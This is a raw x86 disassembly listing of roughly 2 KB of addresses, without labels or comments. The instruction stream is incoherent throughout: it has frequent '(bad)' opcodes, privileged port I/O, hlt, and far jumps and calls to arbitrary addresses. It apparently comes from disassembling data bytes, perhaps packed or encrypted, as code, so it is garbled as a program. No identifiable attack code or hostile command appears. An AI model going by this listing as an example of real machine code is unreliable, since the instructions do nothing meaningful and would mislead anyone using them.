  416a0c:	sub    esi,DWORD PTR [edx]
  416a0e:	lock out dx,al
  416a10:	int3   
  416a11:	xor    BYTE PTR [esi+edx*2],bh
  416a14:	xlat   BYTE PTR ds:[ebx]
  416a15:	scas   al,BYTE PTR es:[edi]
  416a16:	aas    
  416a17:	xchg   DWORD PTR [eax],ebx
  416a19:	repnz aaa 
  416a1b:	ins    BYTE PTR es:[edi],dx
  416a1c:	out    dx,al
  416a1d:	es xchg edx,eax
  416a1f:	xor    eax,0x2cb463f6
  416a24:	or     BYTE PTR [edi],dh
  416a26:	ror    al,0xf9
  416a29:	loop   0x416aaa
  416a2b:	imul   DWORD PTR [ecx+0x6d]
  416a2e:	pop    es
  416a2f:	into   
  416a30:	clc    
  416a31:	push   ecx
  416a32:	pop    es
  416a33:	inc    ecx
  416a34:	icebp  
  416a35:	or     esi,ecx
  416a37:	mov    esi,0x1336f11d
  416a3c:	ja     0x416a51
  416a3e:	nop
  416a3f:	add    DWORD PTR [ecx],esp
  416a41:	mov    eax,ds:0x4e047dc9
  416a46:	mov    eax,ds:0x7e942b46
  416a4b:	inc    esi
  416a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a4d:	push   esp
  416a4e:	lds    ebp,FWORD PTR [esp+eax*2-0x6c541ff]
  416a55:	cmc    
  416a56:	ds (bad) 
  416a58:	adc    edi,DWORD PTR [eax]
  416a5a:	in     al,0x7c
  416a5c:	jmp    0x416a31
  416a5e:	test   bl,ah
  416a60:	xchg   edx,eax
  416a61:	add    DWORD PTR [edi-0x61],edx
  416a64:	pop    edi
  416a65:	loopne 0x416adb
  416a67:	popf   
  416a68:	pushf  
  416a69:	mov    eax,0xc12a14c6
  416a6e:	xor    esp,DWORD PTR [esi]
  416a70:	dec    ecx
  416a71:	mov    dh,0x9e
  416a73:	aaa    
  416a74:	jns    0x416aa0
  416a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a77:	in     al,0xd9
  416a79:	lahf   
  416a7a:	jno    0x416ac7
  416a7c:	xchg   DWORD PTR [eax+0x3ae7a51c],esi
  416a82:	sub    BYTE PTR [esi+0x7d],bh
  416a85:	jmp    0x416ab9
  416a87:	adc    bl,BYTE PTR [ebp+0x2b54c906]
  416a8d:	mov    ch,0x3e
  416a8f:	in     al,dx
  416a90:	push   esp
  416a91:	dec    ebp
  416a92:	es aas 
  416a94:	hlt    
  416a95:	pop    ss
  416a96:	cmp    ch,BYTE PTR [ebx-0x5a6f4bda]
  416a9c:	(bad)  
  416a9d:	pop    edi
  416a9e:	pop    ecx
  416a9f:	repz mov eax,DWORD PTR [eax]
  416aa2:	and    BYTE PTR [eax-0x77],bl
  416aa5:	xor    ch,BYTE PTR [edx]
  416aa7:	lahf   
  416aa8:	and    eax,0x8827cfc4
  416aad:	shl    BYTE PTR [esi],0x66
  416ab0:	das    
  416ab1:	test   BYTE PTR [ebp-0x3b4eb7e5],dh
  416ab7:	call   0xe52d:0xf8717d57
  416abe:	push   ebx
  416abf:	rol    DWORD PTR [eax],1
  416ac1:	mov    eax,edx
  416ac3:	arpl   WORD PTR [eax],dx
  416ac5:	and    ebp,ecx
  416ac7:	jle    0x416b33
  416ac9:	xor    al,0x3
  416acb:	pusha  
  416acc:	push   ebp
  416acd:	push   esi
  416ace:	push   ebx
  416acf:	mov    WORD PTR [ecx],ds
  416ad1:	popf   
  416ad2:	into   
  416ad3:	inc    esp
  416ad4:	mov    eax,ss:0xa9ad87f1
  416ada:	xlat   BYTE PTR ds:[ebx]
  416adb:	pop    edi
  416adc:	jge    0x416b0a
  416ade:	repz pop edi
  416ae0:	add    eax,DWORD PTR [esi]
  416ae2:	retf   
  416ae3:	lods   al,BYTE PTR ds:[esi]
  416ae4:	mov    ebp,0x30f34e62
  416ae9:	push   0x16349d8b
  416aee:	cmp    DWORD PTR [ebx],ecx
  416af0:	push   es
  416af1:	xchg   ebp,eax
  416af2:	iret   
  416af3:	sub    eax,0xc11684bf
  416af8:	sbb    DWORD PTR [edi-0x7d],edi
  416afb:	pop    ecx
  416afc:	pusha  
  416afd:	xlat   BYTE PTR ds:[ebx]
  416afe:	and    ah,BYTE PTR [eax-0x1e0f4afc]
  416b04:	lds    edi,FWORD PTR [eax-0x39e8a867]
  416b0a:	adc    al,0x73
  416b0c:	push   0x846c3111
  416b11:	mov    DWORD PTR [eax-0x55a78711],ebx
  416b17:	cmp    ebp,eax
  416b19:	mov    bh,0x1f
  416b1b:	sbb    esp,DWORD PTR [eax+0x7a435f72]
  416b21:	lods   al,BYTE PTR ds:[esi]
  416b22:	stos   BYTE PTR es:[edi],al
  416b23:	push   ecx
  416b24:	je     0x416afa
  416b26:	dec    edi
  416b27:	jns    0x416b09
  416b29:	cmp    esi,DWORD PTR [esi]
  416b2b:	push   ebp
  416b2c:	inc    esp
  416b2d:	imul   ch
  416b2f:	nop
  416b30:	dec    ecx
  416b31:	pop    ebx
  416b32:	push   0x40
  416b34:	mov    al,ds:0xa2314815
  416b39:	pusha  
  416b3a:	test   DWORD PTR [ebx+0x3d],0xf8203103
  416b41:	aaa    
  416b42:	lahf   
  416b43:	scas   eax,DWORD PTR es:[edi]
  416b44:	mov    DWORD PTR [esi],ebx
  416b46:	in     al,0x8b
  416b48:	jae    0x416b31
  416b4a:	test   BYTE PTR ds:0x8dce47c3,bl
  416b51:	lock mov cl,0x33
  416b54:	ror    BYTE PTR [edi+0x73],0xab
  416b58:	les    esp,FWORD PTR [ecx+edi*1+0x66]
  416b5c:	ffree  st(0)
  416b5e:	xor    BYTE PTR [ecx-0x2a433f66],dl
  416b64:	and    dh,BYTE PTR [ecx+0x20e823a9]
  416b6a:	call   esi
  416b6c:	pushf  
  416b6d:	push   0xd4a11346
  416b72:	add    ah,al
  416b74:	mov    ds:0xea270f2e,eax
  416b79:	neg    BYTE PTR ds:0x2540099f
  416b7f:	mov    esi,0x5bf0ea99
  416b84:	jg     0x416b93
  416b86:	mov    ch,BYTE PTR [esi]
  416b88:	adc    esi,ebp
  416b8a:	push   ss
  416b8b:	and    BYTE PTR [eax+edx*4+0x6c],0x1a
  416b90:	scas   al,BYTE PTR es:[edi]
  416b91:	sub    al,0x18
  416b93:	push   esi
  416b94:	push   0x9af43388
  416b99:	test   dh,al
  416b9b:	jecxz  0x416b52
  416b9d:	lods   eax,DWORD PTR ds:[esi]
  416b9e:	jmp    0x54aefb59
  416ba3:	ret    0x27c5
  416ba6:	push   edi
  416ba7:	and    eax,0x2c7ff17b
  416bac:	pusha  
  416bad:	(bad)  
  416bae:	mov    eax,ds:0xc89430aa
  416bb3:	test   eax,0x6c463950
  416bb8:	mov    WORD PTR [eax-0xa45d5c4],?
  416bbe:	xlat   BYTE PTR ds:[ebx]
  416bbf:	outs   dx,BYTE PTR ds:[esi]
  416bc0:	repnz out dx,eax
  416bc2:	rcl    BYTE PTR [eax],cl
  416bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bc5:	mov    al,ds:0x4366b874
  416bca:	add    DWORD PTR [edx],edi
  416bcc:	inc    esp
  416bcd:	loop   0x416c12
  416bcf:	ret    
  416bd0:	data16 cmp BYTE PTR [eax-0x5c7d1920],cl
  416bd7:	sbb    al,0xc9
  416bd9:	rcr    DWORD PTR fs:[esi],0x4a
  416bdd:	inc    edi
  416bde:	out    0x38,eax
  416be0:	push   es
  416be1:	shl    BYTE PTR [ebx-0x763a375a],1
  416be7:	mov    cl,0x74
  416be9:	mov    al,0x20
  416beb:	mov    ecx,0x61793435
  416bf0:	iret   
  416bf1:	nop
  416bf2:	dec    ecx
  416bf3:	imul   ecx,DWORD PTR [ebp-0x7d6f0701],0x5a323ba7
  416bfd:	ds je  0x416b8c
  416c00:	pop    eax
  416c01:	or     dl,ah
  416c03:	sub    BYTE PTR [esi],ah
  416c05:	fsubp  st(5),st
  416c07:	(bad)  [esi]
  416c09:	xchg   ebx,eax
  416c0a:	mov    al,ds:0xd06dfe0a
  416c0f:	out    0xe6,eax
  416c11:	cmp    ebp,DWORD PTR [esi+0x2997b448]
  416c17:	(bad)  
  416c18:	mov    al,ds:0x7b898397
  416c1d:	mov    BYTE PTR [ebp+0x3],bh
  416c20:	push   0x58
  416c22:	cmp    BYTE PTR [ebp-0x3fe7fd73],0x15
  416c29:	jle    0x416caa
  416c2b:	or     al,0x57
  416c2d:	test   al,0x4a
  416c2f:	stos   DWORD PTR es:[edi],eax
  416c30:	jge    0x416c53
  416c32:	out    0xc7,al
  416c34:	adc    esp,edx
  416c36:	in     al,0x49
  416c38:	push   ebp
  416c39:	fdivr  QWORD PTR [esi]
  416c3b:	cmp    esi,ebx
  416c3d:	(bad)  
  416c3e:	(bad)  
  416c3f:	js     0x416c95
  416c41:	pop    eax
  416c42:	adc    BYTE PTR [ebx],bl
  416c44:	ret    
  416c45:	retf   
  416c46:	fs icebp 
  416c48:	xchg   edx,eax
  416c49:	jo     0x416c14
  416c4b:	imul   ebp,DWORD PTR [edi-0x68938869],0xffffffec
  416c52:	ss (bad) 
  416c54:	aas    
  416c55:	aad    0x94
  416c57:	xchg   esp,eax
  416c58:	add    DWORD PTR [esi-0x540be797],edi
  416c5e:	push   eax
  416c5f:	cld    
  416c60:	or     DWORD PTR [ecx-0x2084e227],ecx
  416c66:	push   ecx
  416c67:	jmp    0x5f31:0x233a4512
  416c6e:	aam    0xd2
  416c70:	dec    edi
  416c71:	push   eax
  416c72:	ret    
  416c73:	mov    al,0x43
  416c75:	jne    0x416c3d
  416c77:	mov    ds:0xedb38659,eax
  416c7c:	xor    edi,DWORD PTR [ecx]
  416c7e:	cwde   
  416c7f:	mul    BYTE PTR [esi+eiz*1]
  416c82:	aas    
  416c83:	and    eax,0x4fee97ff
  416c88:	cmp    eax,eax
  416c8a:	int    0x4b
  416c8c:	jb     0x416cee
  416c8e:	add    DWORD PTR [edi-0x2c6aa1b],esp
  416c94:	jno    0x416c7d
  416c96:	push   ds
  416c97:	jle    0x416d02
  416c99:	jp     0x416ca5
  416c9b:	int3   
  416c9c:	adc    ah,dh
  416c9e:	or     esp,DWORD PTR [eax]
  416ca0:	mov    al,ds:0xd4fae9d0
  416ca5:	add    BYTE PTR [ecx-0x1a],dl
  416ca8:	and    ebp,ebp
  416caa:	mov    bh,BYTE PTR [ebx-0x5a]
  416cad:	pop    DWORD PTR [ecx]
  416caf:	inc    edi
  416cb0:	inc    eax
  416cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cb2:	shr    BYTE PTR [ecx],cl
  416cb4:	cmp    eax,0xa454209c
  416cb9:	add    al,0x95
  416cbb:	or     BYTE PTR [ebx+0x41],al
  416cbe:	aad    0x13
  416cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cc1:	push   0xc78b3b83
  416cc6:	fsubrp st(3),st
  416cc8:	inc    ebp
  416cc9:	xchg   esp,eax
  416cca:	(bad)  
  416ccb:	adc    BYTE PTR [esi-0x100632ba],ah
  416cd1:	or     eax,0x512cb638
  416cd6:	dec    esi
  416cd7:	mov    esi,0x148055b
  416cdc:	rcl    BYTE PTR [ecx+eax*4],0x10
  416ce0:	lods   eax,DWORD PTR ds:[esi]
  416ce1:	call   0x6ba2:0x43127aec
  416ce8:	push   ecx
  416ce9:	jno    0x416d62
  416ceb:	loopne 0x416cf7
  416ced:	pop    ebx
  416cee:	sub    DWORD PTR [esi+0x3dd8b07f],0xffffff9a
  416cf5:	(bad)  
  416cf6:	std    
  416cf7:	jbe    0x416d4e
  416cf9:	test   eax,0x61a58472
  416cfe:	sbb    esi,DWORD PTR [ecx-0x32]
  416d01:	mov    ebx,0xc432baf4
  416d06:	retf   
  416d07:	ficomp WORD PTR [esi]
  416d09:	dec    ebp
  416d0a:	clc    
  416d0b:	mov    eax,0xeed7f4d3
  416d10:	cmp    eax,0x4dd33563
  416d15:	mov    edx,0xd2a95653
  416d1a:	rcr    DWORD PTR [eax-0x4e],cl
  416d1d:	mov    ah,0x3e
  416d1f:	adc    ebx,edi
  416d21:	inc    esp
  416d22:	imul   edx,DWORD PTR [edi+eax*2],0x72
  416d26:	sahf   
  416d27:	jl     0x416cbf
  416d29:	(bad)  
  416d2a:	pop    ds
  416d2b:	(bad)  
  416d2e:	mov    esp,0xf79c4f62
  416d33:	ret    
  416d34:	adc    esp,DWORD PTR [ebx+0x3b]
  416d37:	std    
  416d38:	xor    al,0x5c
  416d3a:	js     0x416ce1
  416d3c:	mov    ebx,0x3a478f29
  416d41:	cmpps  xmm0,XMMWORD PTR [edi-0xa],0xbd
  416d46:	fist   DWORD PTR [ecx]
  416d48:	int3   
  416d49:	sub    BYTE PTR [ecx+0x2d754e75],bh
  416d4f:	and    esi,DWORD PTR [ebp-0x74]
  416d52:	sbb    dh,BYTE PTR [eax]
  416d54:	jne    0x416d22
  416d56:	cmp    BYTE PTR [esi+0x6e],al
  416d59:	mov    DWORD PTR [ecx],esp
  416d5b:	bound  esi,QWORD PTR [ecx+0x5fead8e4]
  416d61:	sbb    BYTE PTR [esi*1-0x6e5b33fc],ch
  416d68:	mov    bl,0xf
  416d6a:	xchg   edx,eax
  416d6b:	mov    dl,0x7
  416d6d:	stc    
  416d6e:	mov    ds:0x6c86dd0f,al
  416d73:	mov    esi,0x6d6f89bb
  416d78:	mov    ch,0x42
  416d7a:	fs out dx,al
  416d7c:	loope  0x416d3a
  416d7e:	xchg   esi,eax
  416d7f:	out    0x35,eax
  416d81:	into   
  416d82:	(bad)  
  416d83:	(bad)  
  416d85:	js     0x416d6f
  416d87:	jo     0x416d0f
  416d89:	xchg   edi,eax
  416d8a:	jns    0x416de3
  416d8c:	push   ebx
  416d8d:	lahf   
  416d8e:	enter  0xbde5,0xf3
  416d92:	xchg   ebp,eax
  416d93:	(bad)  [esi-0x4c9ba2db]
  416d99:	adc    eax,0x6cc1af90
  416d9e:	pop    ss
  416d9f:	iret   
  416da0:	add    eax,0xe2898055
  416da5:	sbb    eax,esi
  416da7:	test   edi,esp
  416da9:	add    esi,DWORD PTR [edx]
  416dab:	sub    BYTE PTR [ebp+0x52],cl
  416dae:	sbb    edx,DWORD PTR [edi-0xc95a2f8]
  416db4:	mov    dh,0x9c
  416db6:	out    dx,eax
  416db7:	imul   ecx,eax,0xfd5bdf4e
  416dbd:	jae    0x416ddd
  416dbf:	cmp    eax,0x2822207a
  416dc4:	mov    ah,0x88
  416dc6:	lahf   
  416dc7:	cmp    edi,edx
  416dc9:	(bad)  
  416dca:	test   DWORD PTR [eax-0x6],0xd214c3b0
  416dd1:	fs lock iret 
  416dd4:	arpl   WORD PTR [ecx+0x51a58a29],dx
  416dda:	stc    
  416ddb:	bound  ecx,QWORD PTR [edi+eiz*8-0x736191b6]
  416de2:	inc    esp
  416de3:	retf   0x1651
  416de6:	fcmovbe st,st(2)
  416de8:	inc    edi
  416de9:	mov    dh,0x6f
  416deb:	test   al,0xab
  416ded:	pop    ds
  416dee:	pusha  
  416def:	or     eax,0x78455de8
  416df4:	rol    DWORD PTR [ebx-0x25],1
  416df7:	sahf   
  416df8:	popf   
  416df9:	mov    ch,0xbe
  416dfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dfc:	dec    ebx
  416dfd:	xor    ebp,0xffffffc5
  416e00:	frstor [esi-0x283114fe]
  416e06:	enter  0x8275,0x14
  416e0a:	cmc    
  416e0b:	inc    ebx
  416e0c:	sbb    eax,0xd2f8f68a
  416e11:	push   0xffffffa9
  416e13:	cmp    al,ch
  416e15:	rol    DWORD PTR [ebx-0x36],0x87
  416e19:	dec    edx
  416e1a:	int3   
  416e1b:	dec    ecx
  416e1c:	add    BYTE PTR [ecx-0x4c],ch
  416e1f:	and    DWORD PTR [eax-0x76],0xffffffe1
  416e23:	(bad)  
  416e25:	inc    ebx
  416e26:	add    al,0x74
  416e28:	push   ss
  416e29:	push   eax
  416e2a:	and    edx,ecx
  416e2c:	mov    edi,0xb14ba4e6
  416e31:	call   0x9d6ba577
  416e36:	mov    ch,0x82
  416e38:	dec    esi
  416e39:	loopne 0x416e25
  416e3b:	shr    ebx,cl
  416e3d:	fmul   DWORD PTR [ebx-0x45]
  416e40:	mov    al,ds:0xcd0ef7bb
  416e45:	cmp    DWORD PTR [ecx],edi
  416e47:	into   
  416e48:	fcmove st,st(1)
  416e4a:	push   ebp
  416e4b:	(bad)  
  416e4c:	mov    ss,WORD PTR [edx]
  416e4e:	dec    esp
  416e4f:	(bad)  
  416e50:	and    eax,0xbba44bbc
  416e55:	jo     0x416e7b
  416e57:	jmp    0xe423135a
  416e5c:	or     esi,edx
  416e5e:	jne    0x416dff
  416e60:	mov    DWORD PTR [edx+0x56],edi
  416e63:	ret    0x6ce2
  416e66:	lea    eax,[eax]
  416e68:	test   al,0xdc
  416e6a:	(bad)  
  416e6b:	sub    BYTE PTR [ebx],dh
  416e6d:	inc    esi
  416e6e:	pop    esi
  416e6f:	cmp    eax,0xf2945c2a
  416e74:	scas   eax,DWORD PTR es:[edi]
  416e75:	xor    dl,BYTE PTR [edx]
  416e77:	in     eax,0xd4
  416e79:	or     eax,0x351ec9d6
  416e7e:	out    0xa0,eax
  416e80:	or     DWORD PTR [esi+0x1d],esi
  416e83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e84:	(bad)  
  416e85:	or     eax,0xea1997d0
  416e8a:	push   ebp
  416e8b:	mov    ebp,0x91b51dd2
  416e90:	and    ah,BYTE PTR ds:0x426ea2b
  416e96:	int    0x9a
  416e98:	inc    ebp
  416e99:	add    al,0xb
  416e9b:	jge    0x416e97
  416e9d:	daa    
  416e9e:	mov    dh,0x38
  416ea0:	or     DWORD PTR [ebx+0x3a88dfad],0xe2ee1b9f
  416eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416eab:	jg     0x416ee0
  416ead:	test   al,0x32
  416eaf:	gs push 0xffffff8f
  416eb2:	cmp    ebp,DWORD PTR [ebx]
  416eb4:	or     ebx,DWORD PTR [esi]
  416eb6:	lods   eax,DWORD PTR ds:[esi]
  416eb7:	(bad)  
  416eb8:	mov    eax,ds:0xd8d8615c
  416ebd:	xchg   edi,eax
  416ebe:	pop    edi
  416ebf:	in     al,dx
  416ec0:	xchg   al,ch
  416ec2:	push   ds
  416ec3:	ds scas al,BYTE PTR es:[edi]
  416ec5:	sub    DWORD PTR [ecx-0x36],edi
  416ec8:	xchg   DWORD PTR [edi-0x6f914d80],ecx
  416ece:	push   es
  416ecf:	xor    al,0x22
  416ed1:	(bad)  
  416ed2:	stc    
  416ed3:	es and ecx,ecx
  416ed6:	mov    ch,0x3e
  416ed8:	call   0xa9f4:0x255bc2d4
  416edf:	or     eax,0xac5e26ce
  416ee4:	je     0x416f05
  416ee6:	in     eax,0x62
  416ee8:	popa   
  416ee9:	jne    0x416f34
  416eeb:	loopne 0x416f01
  416eed:	stc    
  416eee:	test   al,0xc1
  416ef0:	and    eax,0x4e3b7924
  416ef5:	add    bl,al
  416ef7:	xor    BYTE PTR [edx+0x56],ah
  416efa:	inc    ebx
  416efb:	jb     0x416ede
  416efd:	ret    0xb2d1
  416f00:	or     al,0x7a
  416f03:	test   eax,0x988af0b2
  416f08:	fisttp QWORD PTR es:[esi+0x11]
  416f0c:	adc    al,0xf6
  416f0e:	shl    DWORD PTR [ecx-0xe],1
  416f11:	push   esi
  416f12:	push   edx
  416f13:	mov    ds:0xdca049da,al
  416f18:	rol    esp,0x33
  416f1b:	call   0x482111e7
  416f20:	sub    DWORD PTR [edx-0x22],edi
  416f23:	call   0x605769b3
  416f28:	mov    es,WORD PTR ds:0x91b43082
  416f2e:	mov    es,ebp
  416f30:	add    esi,DWORD PTR [esi+0x2650d9df]
  416f36:	inc    eax
  416f37:	mov    al,ds:0x7f2b6d8d
  416f3c:	out    dx,al
  416f3d:	int    0x76
  416f3f:	adc    eax,0xe0aebfe2
  416f44:	jns    0x416fc2
  416f46:	cmp    eax,0x50adbbc0
  416f4b:	push   eax
  416f4c:	aaa    
  416f4d:	sub    dh,bl
  416f4f:	add    DWORD PTR [eax],esi
  416f51:	int    0x58
  416f53:	int3   
  416f54:	jb     0x416fac
  416f56:	fs stos BYTE PTR es:[edi],al
  416f58:	dec    ebp
  416f59:	pop    edx
  416f5a:	push   esi
  416f5b:	popa   
  416f5c:	(bad)  
  416f5d:	mov    ds:0x22683ab,al
  416f62:	push   edx
  416f63:	sub    al,0xa0
  416f65:	add    edx,DWORD PTR [eax]
  416f67:	cmp    DWORD PTR [edx-0x4eb293c5],ebx
  416f6d:	ds std 
  416f6f:	imul   edx,DWORD PTR [ecx],0x6a091ab6
  416f75:	dec    edx
  416f76:	rol    dl,1
  416f78:	jno    0x416f1e
  416f7a:	jmp    0xa5b73a76
  416f7f:	push   esi
  416f80:	xchg   edi,eax
  416f81:	lock jae 0x416f25
  416f84:	mov    esi,0xbb7b3d71
  416f89:	(bad)  
  416f8a:	sbb    BYTE PTR [eax+ebp*1+0x41e2ff8f],dl
  416f91:	dec    edi
  416f92:	test   al,0xc6
  416f94:	sbb    dh,ah
  416f96:	jmp    0x4a65:0xbb867416
  416f9d:	aas    
  416f9e:	mov    WORD PTR [edx],ss
  416fa0:	adc    al,0x96
  416fa2:	nop
  416fa3:	push   ebp
  416fa4:	dec    eax
  416fa5:	mov    eax,ds:0x983beb5e
  416faa:	fsub   QWORD PTR [edi+0x79]
  416fad:	xchg   esp,eax
  416fae:	sbb    BYTE PTR [eax],0x9c
  416fb1:	jg     0x41702d
  416fb3:	shr    DWORD PTR [esi+0x2a],cl
  416fb6:	popa   
  416fb7:	js     0x416fdd
  416fb9:	in     al,0xf8
  416fbb:	test   eax,edi
  416fbd:	fsubr  DWORD PTR [eax+0x76]
  416fc0:	lods   al,BYTE PTR ds:[esi]
  416fc1:	out    dx,eax
  416fc2:	ss or  al,0x22
  416fc5:	hlt    
  416fc6:	push   eax
  416fc7:	bound  edx,QWORD PTR [eax+0x7d]
  416fca:	pop    ss
  416fcb:	shl    BYTE PTR [edx+0x13],1
  416fce:	clc    
  416fcf:	jmp    0x416fe1
  416fd1:	adc    edx,esp
  416fd3:	lods   al,BYTE PTR ds:[esi]
  416fd4:	cwde   
  416fd5:	pop    ebp
  416fd6:	pop    edi
  416fd7:	pop    ecx
  416fd8:	xor    edx,ebx
  416fda:	adc    ecx,DWORD PTR [eax]
  416fdc:	push   esi
  416fdd:	inc    ecx
  416fde:	lods   eax,DWORD PTR ds:[esi]
  416fdf:	mov    eax,ds:0xb774eea3
  416fe4:	pop    eax
  416fe5:	and    esi,DWORD PTR [eax+esi*2+0x5e]
  416fe9:	ret    
  416fea:	fnstenv [edi+0x2476b538]
  416ff0:	mov    ebx,0xeb174e3a
  416ff5:	(bad)  
  416ff6:	fsub   QWORD PTR [ebx+0x1a]
  416ff9:	mov    gs,WORD PTR [edi+0x7abfd1b5]
  416fff:	sbb    DWORD PTR [eax-0x7e],0x19
  417003:	pop    ss
  417004:	sub    bl,BYTE PTR [ebx-0x4b]
  417007:	xor    dh,cl
  417009:	ins    DWORD PTR es:[edi],dx
  41700a:	pop    edi
  41700b:	xor    BYTE PTR [esi],ah
  41700d:	pop    ds
  41700e:	cmp    DWORD PTR [edi-0x6c],esi
  417011:	jg     0x416fe5
  417013:	mov    dl,0x33
  417015:	push   edx
  417016:	mov    ah,0xb5
  417018:	je     0x41704d
  41701a:	push   0xffffffb5
  41701c:	inc    edi
  41701d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41701e:	jg     0x417072
  417020:	and    eax,0xcd602f0f
  417025:	xchg   edx,eax
  417026:	jne    0x4170a3
  417028:	inc    esp
  417029:	sub    dl,BYTE PTR [eax]
  41702b:	push   esi
  41702c:	aaa    
  41702d:	(bad)  
  41702e:	fcmovnu st,st(3)
  417030:	jns    0x417051
  417032:	ret    
  417033:	(bad)  
  417034:	and    eax,0x736f301c
  417039:	cdq    
  41703a:	ficom  WORD PTR [edi]
  41703c:	sbb    eax,0x1f01c488
  417041:	out    0x56,al
  417043:	or     edx,DWORD PTR [edi]
  417045:	add    BYTE PTR [ecx+0x41],bh
  417048:	pop    ebx
  417049:	ror    BYTE PTR [edx+0x7d5487c4],0x9a
  417050:	xchg   esp,eax
  417051:	adc    BYTE PTR [esi-0x64a6ba5d],dl
  417057:	xor    al,0xa7
  417059:	(bad)  
  41705a:	ret    
  41705b:	mov    ah,0x4f
  41705d:	scas   al,BYTE PTR es:[edi]
  41705e:	push   edi
  41705f:	push   0x5f
  417061:	jae    0x41702c
  417063:	sub    ebx,ebx
  417065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417066:	scas   eax,DWORD PTR es:[edi]
  417067:	cmp    eax,0xbbc40d7c
  41706c:	stos   DWORD PTR es:[edi],eax
  41706d:	pop    ds
  41706e:	and    al,0x20
  417070:	pop    esp
  417071:	fsubp  st(3),st
  417073:	das    
  417074:	sbb    eax,0xfcdc0f1e
  417079:	not    BYTE PTR [edi-0x3f]
  41707c:	sub    eax,0x7ddd49e1
  417081:	dec    edi
  417082:	neg    DWORD PTR [eax+0x41c6cacf]
  417088:	push   esi
  417089:	inc    ebx
  41708a:	adc    eax,0xe79b61d2
  41708f:	pop    eax
  417090:	adc    si,0x23
  417094:	pop    ecx
  417095:	mov    edx,0x5790f400
  41709a:	ins    DWORD PTR es:[edi],dx
  41709b:	jecxz  0x417097
  41709d:	imul   esi,DWORD PTR [eax+0x1f],0x763e70f2
  4170a4:	fisttp WORD PTR [ebx]
  4170a6:	js     0x417087
  4170a8:	push   ebp
  4170a9:	dec    esi
  4170aa:	jmp    0xe6b52e8f
  4170af:	and    eax,0x150cd251
  4170b4:	ins    BYTE PTR es:[edi],dx
  4170b5:	repnz shl ebp,1
  4170b8:	sub    ecx,DWORD PTR [edi+ebx*8-0x30]
  4170bc:	push   es
  4170bd:	push   ds
  4170be:	mov    eax,0x8d31e83a
  4170c3:	cmp    esi,esi
  4170c5:	int3   
  4170c6:	inc    ebx
  4170c7:	mov    cl,0xcd
  4170c9:	and    ah,bh
  4170cb:	mov    bh,0xc5
  4170cd:	and    bl,BYTE PTR [esi]
  4170cf:	loopne 0x41713c
  4170d1:	cwde   
  4170d2:	jmp    0x8465:0xc994d28c
  4170d9:	das    
  4170da:	add    esi,edi
  4170dc:	pop    ds
  4170dd:	shl    ch,1
  4170df:	shl    BYTE PTR [esi],1
  4170e1:	mov    dl,0xe0
  4170e3:	lds    ebx,FWORD PTR [ecx]
  4170e5:	cmp    cl,BYTE PTR [ebx+0x2]
  4170e8:	retf   
  4170e9:	popf   
  4170ea:	int3   
  4170eb:	push   esi
  4170ec:	shr    DWORD PTR [ebp+0x5c],cl
  4170ef:	js     0x41708c
  4170f1:	clc    
  4170f2:	or     DWORD PTR [esi+eiz*1-0x49],edi
  4170f6:	dec    ebp
  4170f7:	leave  
  4170f8:	xchg   ebx,eax
  4170f9:	fistp  QWORD PTR [ebx+0x55bd0897]
  4170ff:	xchg   edi,eax
  417100:	and    DWORD PTR [ebp-0x15960c39],0x5b
  417107:	xor    DWORD PTR [esi-0x70],ebx
  41710a:	pop    esi
  41710b:	out    dx,eax
  41710c:	jmp    0xc852:0x6237f780
  417113:	mov    ds:0xb89c4d3b,al
  417118:	shl    BYTE PTR [ebp+eiz*2+0x44d4407d],1
  41711f:	ss jl  0x417107
  417122:	les    ebx,FWORD PTR [esi-0x7a]
  417125:	adc    BYTE PTR [edx+0x740ed380],ch
  41712b:	data16 (bad) 
  41712d:	jae    0x4171a8
  41712f:	sub    BYTE PTR [ebx],dl
  417131:	in     al,dx
  417132:	enter  0x15cc,0x30
  417136:	and    bl,BYTE PTR [ecx-0x2]
  417139:	nop
  41713a:	xor    al,0xf0
  41713c:	mov    ds:0x41c0913b,eax
  417141:	pop    esp
  417142:	sub    esi,ecx
  417144:	push   0xffffffd1
  417146:	or     al,0xc
  417148:	fistp  DWORD PTR [edx+0x11]
  41714b:	push   edx
  41714c:	pushf  
  41714d:	push   0x3c
  41714f:	popf   
  417150:	test   BYTE PTR ds:0x4f31136a,0xfd
  417157:	cmp    eax,0x8b4b0745
  41715c:	push   0x83b97f90
  417161:	mov    esi,0x13519c2e
  417166:	imul   ebp,edx,0x29
  417169:	fadd   QWORD PTR [ecx-0x5]
  41716c:	and    DWORD PTR [ebx-0x16],ebp
  41716f:	cmp    DWORD PTR [eax+0x22],ebp
  417172:	pop    ebp
  417173:	xor    al,0x11
  417175:	or     bl,cl
  417177:	(bad)  
  417178:	cmp    esi,esi
  41717a:	pop    ss
  41717b:	jae    0x41717d
  41717d:	or     edx,DWORD PTR [edi-0x4d]
  417180:	into   
  417181:	ret    
  417182:	inc    edi
  417183:	adc    bl,BYTE PTR [ecx+esi*1]
  417186:	cmp    BYTE PTR [ebp+0x1e69f50c],0x1e
  41718d:	push   ds
  41718e:	pop    edx
  41718f:	push   edx
  417190:	out    0x8a,eax
  417192:	dec    ebx
  417193:	mov    BYTE PTR [edx-0x12353d9a],cl
  417199:	jb     0x41720c
  41719b:	or     DWORD PTR [ebp-0x4c],edx
  41719e:	jge    0x4171eb
  4171a0:	aaa    
  4171a1:	inc    edi
  4171a2:	sbb    DWORD PTR [ebx],0x21b591b
  4171a8:	ins    BYTE PTR es:[edi],dx
  4171a9:	jnp    0x41717a
  4171ab:	sbb    BYTE PTR [edi+0x44],bl
  4171ae:	sub    eax,0x1f18ba2e
  4171b3:	(bad)  [ecx+0x69]
  4171b6:	sbb    DWORD PTR [ebp+0x6c6ffea6],ebp
  4171bc:	jns    0x41716a
  4171be:	sub    DWORD PTR [edx-0x58945cac],0x7b
  4171c5:	rcl    DWORD PTR [di],cl
  4171c8:	push   ecx
  4171c9:	dec    esp
